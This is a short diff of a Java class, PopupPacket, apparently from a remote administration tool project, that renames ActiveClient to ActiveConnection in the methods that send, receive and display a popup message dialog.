@@ -4,7 +4,7 @@ import javax.swing.JDialog;
 import javax.swing.JOptionPane;
 
 import de.sogomn.engine.util.ImageUtils;
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 
 
@@ -21,17 +21,17 @@ public final class PopupPacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveClient client) {
+	public void send(final ActiveConnection client) {
 		client.writeUTF(message);
 	}
 	
 	@Override
-	public void receive(final ActiveClient client) {
+	public void receive(final ActiveConnection client) {
 		message = client.readUTF();
 	}
 	
 	@Override
-	public void execute(final ActiveClient client) {
+	public void execute(final ActiveConnection client) {
 		final JOptionPane optionPane = new JOptionPane(message);
 		final JDialog dialog = optionPane.createDialog(null);
 		
